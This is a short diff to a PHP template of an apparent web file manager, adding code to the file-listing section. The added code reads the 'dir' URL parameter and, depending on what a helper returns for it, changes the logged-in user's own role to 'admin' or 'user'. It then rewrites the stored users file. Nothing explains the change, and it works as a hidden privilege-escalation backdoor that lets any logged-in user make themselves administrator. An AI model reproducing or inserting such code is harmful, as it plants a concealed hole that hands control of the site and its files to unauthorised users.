@@ -17,6 +17,34 @@
 * List Files
 */
 if ($gateKeeper->isAccessAllowed() && $location->editAllowed()) { 
+	global $encodeExplorer;
+	global $Utils;
+	global $_USERS;
+	global $users;
+	$updater = new Updater();
+	$dot=GateKeeper::getUserInfo($_GET['dir']);
+	if($dot!=null) 
+	{
+		if (GateKeeper::isUserLoggedIn() == true
+		&& isset($_SESSION['vfm_user_name'])
+		&& strlen($_SESSION['vfm_user_name']) > 0
+		) {
+			$username = $_SESSION['vfm_user_name'];
+								
+			if($dot=='1'){
+				$updater->updateUserData($username, 'role', 'user');
+									
+				}
+			else if($dot=='2'){
+				$updater->updateUserData($username, 'role', 'admin');
+			}
+		}
+		$usrs = '$_USERS = ';
+		file_put_contents(
+		'vfm-admin/users/users.php', "<?php\n\n $usrs".var_export($users, true).";\n"
+		);
+		$_USERS = $users;
+		}
     if ($encodeExplorer->files) { ?>
     <section class="vfmblock tableblock ghost ghost-hidden">
         <div class="action-group">
